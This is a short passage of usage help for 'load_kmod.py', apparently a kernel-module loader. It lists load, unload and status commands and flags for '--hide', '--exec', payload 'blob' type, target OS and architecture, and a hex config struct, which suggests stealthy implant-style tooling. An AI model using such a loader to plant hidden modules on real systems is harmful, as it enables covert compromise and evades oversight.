mbed/kmod_loader/load_kmod.py load   [--blob-type TYPE] [--exec] [--hide]
mbed/kmod_loader/load_kmod.py unload
mbed/kmod_loader/load_kmod.py status
```

### Blob options (loader tools)
```
  --blob-type TYPE    Blob type (default: hello)
  --blob-os OS        Target OS (default: linux)
  --blob-arch ARCH    Target architecture (default: x86_64)
  --config-hex HEX    Config struct as hex
  --so PATH           Direct .so file path
```
